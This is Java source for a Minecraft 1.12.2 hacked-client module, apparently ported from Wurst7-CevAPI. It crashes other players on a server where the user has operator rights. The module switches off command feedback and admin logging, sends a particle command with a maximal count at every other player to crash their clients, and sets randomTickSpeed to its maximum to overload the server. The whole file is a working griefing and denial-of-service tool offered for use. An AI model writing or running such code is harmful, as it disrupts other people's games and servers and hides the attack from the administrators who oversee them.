/*
 * Wurst0 - a 1.12.2 port of Wurst7-CevAPI
 * Ported from Wurst7-CevAPI OPServerKillModuleHack (GPL-3.0-or-later)
 * Adapted to 1.12.2: the 1.17+ "ash" particle does not exist, so the
 * crash-payload command uses a configurable 1.12.2 particle name.
 * The "Don't crash friends" no-op compatibility option was dropped.
 */
package net.wurst0.hacks;

import java.util.ArrayDeque;
import java.util.Queue;

import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.wurst0.Category;
import net.wurst0.event.listeners.UpdateListener;
import net.wurst0.feature.Hack;
import net.wurst0.settings.CheckboxSetting;
import net.wurst0.settings.SliderSetting;
import net.wurst0.settings.TextFieldSetting;

public final class OPServerKillModuleHack extends Hack
        implements UpdateListener
{
        private final Minecraft mc = Minecraft.getMinecraft();

        private final CheckboxSetting restrictSingleplayer =
                new CheckboxSetting("Restrict singleplayer", true);
        private final CheckboxSetting hideFeedback =
                new CheckboxSetting("Hide command feedback", true);
        private final CheckboxSetting hideAdminLog =
                new CheckboxSetting("Hide admin log", true);
        private final CheckboxSetting crashPlayers =
                new CheckboxSetting("Crash other players", true);
        private final TextFieldSetting particle =
                new TextFieldSetting("Particle", "largesmoke");
        private final SliderSetting delay =
                new SliderSetting("Tick delay", 3, 3, 20, 1);
        private final SliderSetting randomTickSpeed = new SliderSetting(
                "randomTickSpeed", 2147483647, 0, 2147483647, 1);

        private final Queue<String> queue = new ArrayDeque<String>();
        private int ticks;

        public OPServerKillModuleHack()
        {
                super("OPServerKillModule",
                        "Runs the original server-control command sequence:"
                                + " hides command feedback and the admin log,"
                                + " spams a huge particle payload at every other"
                                + " player and sets randomTickSpeed to the max."
                                + " Needs OP.");
                setCategory(Category.CREATIVE_OP);
                addSettings(restrictSingleplayer, hideFeedback, hideAdminLog,
                        crashPlayers, particle, delay, randomTickSpeed);
        }

        @Override
        protected void onEnable()
        {
                queue.clear();

                if(restrictSingleplayer.isChecked() && mc.isSingleplayer())
                {
                        setEnabled(false);
                        return;
                }

                if(hideFeedback.isChecked())
                        queue.add("gamerule sendCommandFeedback false");
                if(hideAdminLog.isChecked())
                        queue.add("gamerule logAdminCommands false");
                if(crashPlayers.isChecked())
                {
                        EntityPlayerSP p = mc.player;
                        String self =
                                p == null ? "" : p.getGameProfile().getName();
                        queue.add("execute @a[name=!" + self + "] ~ ~ ~"
                                + " particle " + particle.getValue().trim()
                                + " ~ ~ ~ 1 1 1 1 2147483647 force @a");
                }
                queue.add("gamerule randomTickSpeed "
                        + randomTickSpeed.getValueI());

                ticks = 0;
        }

        @Override
        protected void onDisable()
        {
                queue.clear();
        }

        @Override
        public void onUpdate()
        {
                EntityPlayerSP p = mc.player;
                if(p == null || mc.getConnection() == null)
                        return;
                if(queue.isEmpty())
                {
                        setEnabled(false);
                        return;
                }
                if(ticks++ < delay.getValueI())
                        return;
                ticks = 0;

                String command = queue.poll();
                // 1.12.2 servers reject chat packets longer than 256 chars.
                if(command.length() + 1 <= 256)
                        p.sendChatMessage("/" + command);
        }
}
